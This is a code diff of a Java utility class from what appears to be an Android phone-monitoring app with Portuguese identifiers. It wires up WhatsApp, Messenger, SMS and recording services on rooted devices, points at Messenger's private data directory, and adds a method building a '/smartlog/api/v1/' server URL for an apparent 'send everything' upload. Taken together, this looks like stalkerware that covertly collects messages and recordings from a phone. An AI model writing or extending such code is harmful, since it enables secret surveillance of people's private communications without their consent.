@@ -76,7 +76,7 @@ import java.util.zip.ZipOutputStream;
 
 public class Utils {
 
-    public static final String BASE64_PUBLIC_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtNBwCmA8QI1p0POCCxNbWYJNw4RP9r3SvumIDcbnSmZQvIGtceRvAU521LR+v8rWd+H4sseghzjGTDHoVu8bSEth1i5iPnFhEn+X7JKnicP+ZWP2AjcYjFCJ/mDLfBYNPVpLe3UiD53Jqswu6JBjEjvDF9Xk8PfiKH0H49ydeTCpnWeyYSEfD07iqv+BpIzKYckaEqACJzKBDfVLP5RNGOPhClcs8Jfpu8+oI7ILzn6hsIvpghmqzrglDZgplMh1Fz2dePYNic/TOS/jexUt2OmofKyu32pwjtcW0tO+nfgMAQ9kXOnbs7GBVJofKwrf1q9zMRoDUsFZV5sddskECQIDAQAB";
+    public static final String PRIMEIRA_CARGA="PRIMEIRA_CARGA";
     public static final byte[] SALT = new byte[]{-32, 58, -52, 48, 15, -124, 123, 64, 60, -44, -122, -91, -23, 53, -23, 123, 44, -123, -111, 43};
 
     public static final String FACEBOOK_DIR_PATH = android.os.Environment.getDataDirectory().toString() + "/data/com.messenger.orca";
@@ -125,6 +125,7 @@ public class Utils {
     public static boolean licenciado = false;
     public static String PREF = "jabi";
     public static String COMPRADO = "potoca";
+    public static String serverURL;
 
     public static Context context;
     public static FileObserver observer;
@@ -593,17 +594,42 @@ public class Utils {
         }
     }
 
+
     // Start the service
     public static void startNewService(Context context, Configuracao configuracao) {
         if (!Utils.isServiceRunning(context)) {
             if (rooted) {
-                context.startService(new Intent(context, WhatsAppService.class));
-                context.startService(new Intent(context, MessengerService.class));
+                startWhats(context,false);
             }
-            context.startService(new Intent(context, SmsService.class));
-            context.startService(new Intent(context, RecordService.class));
+            startServices(context);
         }
         startAlarm(context, configuracao);
+    }
+
+    public static void primeiroStart(Context context, Configuracao configuracao) {
+       if (rooted){
+           startWhats(context,true);
+       }
+        startAlarm(context, configuracao);
+    }
+
+    public static void startServices(Context context) {
+        context.startService(new Intent(context, SmsService.class));
+        context.startService(new Intent(context, RecordService.class));
+    }
+
+    public static void startWhats(Context context,boolean primeiraVez){
+        Intent intent=new Intent(context, WhatsAppService.class);
+        intent.putExtra("primeiraVez",primeiraVez);
+        context.startService(intent);
+    }
+
+    public static void startFace(Context context,boolean primeiraVez){
+        if(rooted) {
+            Intent intent=new Intent(context, MessengerService.class);
+            intent.putExtra("primeiraVez",primeiraVez);
+            context.startService(intent);
+        }
     }
 
     public static void enviarTudo(Context context) {
@@ -646,5 +672,24 @@ public class Utils {
         } catch (SQLException e) {
             e.printStackTrace();
         }
+    }
+
+    public static String getServerUrl(Context context) {
+        try {
+            RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
+            Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
+            if (configuracao != null) {
+                String url=configuracao.getServerUrl();
+                String pos="/smartlog/api/v1/";
+                if(!url.startsWith("http")){
+                    return "http://"+url+pos;
+                }
+                return url+pos;
+            }
+        } catch (SQLException e) {
+            e.printStackTrace();
+        }
+        return "";
+
     }
 }
